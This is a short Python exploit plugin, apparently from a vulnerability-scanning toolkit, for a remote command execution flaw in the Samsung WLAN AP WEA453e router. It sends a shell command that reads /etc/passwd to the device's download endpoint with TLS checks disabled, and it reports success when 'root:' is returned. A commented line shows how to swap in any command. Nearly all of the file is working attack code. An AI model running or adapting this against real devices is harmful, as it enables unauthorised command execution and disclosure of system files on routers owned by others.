#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'http://wiki.fofamini.com/漏洞库/IOT安全/Samsung/三星 WLAN AP WEA453e路由器 远程命令执行漏洞.md',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '三星 WLAN AP WEA453e路由器 远程命令执行漏洞',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
        'User-Agent': ua,
        "Content-Type": "application/x-www-form-urlencoded"
        }
  data = 'command1=shell:cat /etc/passwd| dd of=/tmp/a.txt'
  # data = "command1=shell:{}| dd of=/tmp/a.txt".format(cmd)#exp修改处
  target = '(download)/tmp/a.txt'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "root:" in res.text:
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret